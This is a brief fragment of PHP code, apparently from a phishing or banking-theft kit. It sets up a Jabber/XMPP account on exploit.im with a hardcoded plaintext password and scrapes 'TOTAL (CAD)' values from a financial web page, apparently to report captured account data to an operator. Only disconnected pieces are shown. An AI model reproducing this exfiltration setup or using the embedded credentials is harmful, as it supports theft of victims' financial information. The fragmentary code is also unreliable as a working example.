...
{
	$jabber = array('me'=>'jetfinance1@exploit.im', 'server'=> 'exploit.im', 'port'=>'5222', 'user'=>'jetfinance1@exploit.im', 'pass'=>'smDXumD9fcVw');
...
/*
$_tot = explode('data-title="TOTAL (CAD):">',$e[count($e)]);
unset($_tot[0]);
foreach($_tot as $tot)
{
	$_total = explode('<', $tot);
